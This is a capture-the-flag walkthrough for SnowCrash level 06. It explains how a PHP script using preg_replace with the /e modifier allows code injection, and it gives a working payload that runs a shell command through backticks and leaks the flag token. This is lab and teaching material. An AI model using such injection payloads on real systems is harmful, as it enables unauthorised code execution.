# Level 06 - Mastering PHP

## Inspection

```shell
level06@SnowCrash:~$ ls
level06  level06.php
```

Lets try to run it ! 

```shell
level06@SnowCrash:~$ php script.php coucou

PHP Warning:  Undefined array key 2 in /mnt/c/Users/XZLR839/Documents/intra.42/script.php on line 20

PHP Warning:  file_get_contents(coucou): Failed to open stream: No such file or directory in /mnt/c/Users/XZLR839/Documents/intra.42/script.php on line 9

PHP Warning:  preg_replace(): The /e modifier is no longer supported, use preg_replace_callback instead in /mnt/c/Users/XZLR839/Documents/intra.42/script.php on line 15
```

## Deduction

1. We can see the php script failed to open my string and want to open a file
2. We have already a hint with PHP warning. The attribute /e is obsolete and vulnerable.

Lets take a look at the code.

````php
<?php

function y($m) {
	$m = preg_replace("/\./", " x ", $m); # Replace . with x
	$m = preg_replace("/@/", " y", $m); # Replace @ with y
	return $m;
}

function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); # pattern [x something], execute in y("something")
	$a = preg_replace("/\[/", "(", $a); # replace [ with (
	$a = preg_replace("/\]/", ")", $a); # replace ] with )
	return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
````

## Knowledge

### Preg_replace function

How work this function passed in all the script.

```php
preg_replace("/c/e", "exec('echo blabla')", "coucou")

blablaoublablaou
```

1. Every `c` from `coucou` has been replaced with `blabla`
2. The second argument is the one vulnerable to **RCE** (Remote Code Execution) because it run ``exec + echo``

### Vulnerable PHP Regex

> the ``/e`` attribute is **obsolete** since PHP 5.x and **blocked** in PHP 7.x.

```shell
1:$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
#1:"/(\[x (.*)\])" -> make this pattern -> [x something]
#1:"/e"            -> eval (run) the replaced string like php
#1:"y(\"\\2\")"    -> make this pattern -> y("something");
#1:all "[x something]" pattern in the file mentionned, will be passed in the y function
```

## Exploit

To exploit this you have to pass a `reverse shell` that go trew the `regex` and redirect the output somewhere you can read it.

````shell
echo '[x ${`getflag`}]' >/tmp/06 && ./level06 /tmp/06
````

```shell
level06@SnowCrash:~$ echo '[x ${`getflag`}]' >/tmp/06 && ./level06 /tmp/06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

## Knowledge

```
[x ${`getflag`}]

1. backticks `` in php is like using shell_exec().
1. we will have [x ${"Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub"}]

2. ${} in php is for create or calling dinamical variables
2. PHP search in memory for a variable named -> $Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub

3. PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
3. PHP will always print the name of the variable he failed to call and so we get our token.
```

